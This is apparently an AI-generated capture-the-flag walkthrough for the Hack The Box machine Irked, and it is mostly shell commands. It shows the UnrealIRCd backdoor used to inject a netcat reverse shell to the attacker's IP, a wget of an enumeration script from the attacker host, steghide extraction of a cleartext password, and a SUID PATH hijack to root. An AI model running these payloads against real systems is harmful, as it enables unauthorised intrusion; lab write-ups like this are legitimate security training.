## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- **Initial Access**: IRC backdoor (UnrealIRCd 3.2.8.1)
- **Privilege Escalation**: SUID binary misconfiguration + steganography

---

## 🔍 Recon

### 📦 Full TCP & UDP Scan
```bash
nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.117
nmap -sU -p- --min-rate 10000 -oA nmap/alludp 10.10.10.117
```

### 🔍 Service Detection
```bash
nmap -sC -sV -p 22,80,111,6697,8067,65534 -oA nmap/scripts 10.10.10.117
```

---

## 🌐 Web Enumeration

### 🖼️ Download Site Image
```bash
wget http://10.10.10.117/irked.jpg
```

---

## 💬 [IRC](IRC.md) Enumeration

### 🧰 HexChat (GUI)
Connect to:
```
irked.htb : 6697, 8067, 65534
```

### 🔍 Check UnrealIRCd Exploit
```bash
searchsploit UnrealIRCd
```

---

## 🐚 Shell as ircd (IRC Backdoor Exploit)

### 🔎 Confirm RCE
```bash
nc 10.10.10.117 6697
# In nc:
AB; ping -c 1 10.10.14.14
```

### 🧬 Reverse Shell via IRC
```bash
nc 10.10.10.117 6697
# In nc:
AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.14 443 >/tmp/f
```

```bash
nc -lnvp 443
```

### 🐍 Python Exploit Alternative
```bash
./unreal_3.2.8.1_exploit.py 10.10.10.117 6697 10.10.14.14 443
```

---

## 🧩 PrivEsc: ircd → djmardov

### 📁 Find Hidden File
```bash
cd /home/djmardov/Documents
cat .backup
# Output: UPupDOWNdownLRlrBAbaSSss
```

### 🔓 Extract with steghide
```bash
steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
cat pass.txt
# Output: Kab6h+m+bbp2J:HG
```

### 🔐 su or SSH to djmardov
```bash
su djmardov
# or
ssh djmardov@10.10.10.117
# Password: Kab6h+m+bbp2J:HG
```

```bash
cat user.txt
```

---

## 🔼 PrivEsc: djmardov → root

### 🔍 Upload & Run LinEnum
```bash
cd /dev/shm
wget http://10.10.14.14/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh -t
```

### 🔍 Suspicious Binary
```bash
ls -l /usr/bin/viewuser
# SUID root binary
```

### 📂 Hijack /tmp/listusers
```bash
echo "id" > /tmp/listusers
chmod +x /tmp/listusers
viewuser
```

```bash
echo "sh" > /tmp/listusers
viewuser
```

```bash
id
cat /root/root.txt
```

---

## 🔬 Beyond Root

### 🔍 Metasploit IRC Backdoor Behavior
```bash
msfconsole
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 10.10.10.117
set RPORT 6697
set LHOST 10.10.14.14
set LPORT 4444
run
```

### 🧵 Process List
```bash
ps aux | grep ircd
```

---

## ❌ Alternate Exploit Paths (Did Not Work)

### 🚫 Exim Local Exploit
```bash
/usr/sbin/exim -bV -v | grep Perl
# No Perl → Not vulnerable
```

### 🚫 CVE-2018-6789 Attempt
```bash
# SSH tunnel to expose port 25
ssh djmardov@10.10.10.117 -L 25:localhost:25

# Run exploit
python exim_exp.py 10.10.14.14 443 127.0.0.1
```

---

Let me know if you’d like this merged with your HTB collection or saved as a Markdown file!